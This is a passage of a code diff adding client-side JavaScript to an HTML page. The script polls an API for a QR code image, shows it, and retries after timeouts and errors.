+                .then((response) => {
+                    if (response.status == 200) {
+                        return response.json();
+                    } else if (response.status == 408) {
+                        console.log("timed out");
+
+                        if (qrPolling) {
+                            updateQR(t);
+                        }
+                    } else {
+                        throw "http error: " + response.status;
+                    }
+                })
+                .then((data) => {
+                    if (!qrPolling) {
+                        return;
+                    }
+
+                    if (data !== undefined) {
+                        console.log("api success:", data);
+
+                        var o = document.getElementById("qrCode");
+
+                        if (o != null) {
+                            o.src = data.source;
+                            o.style = "display: block";
+                        }
+                        updatePage(data.host);
+                        updateQR(data.update_time);
+                    }
+                })
+                .catch((error) => {
+                    console.error("api error:", error);
+
+                    if (qrPolling) {
+                        setTimeout(function () {
+                            updateQR(t);
+                        }, 10000);
+                    }
+                });
+        }
+
+        updateAuthenticated(0);
+    </script>
+</html>
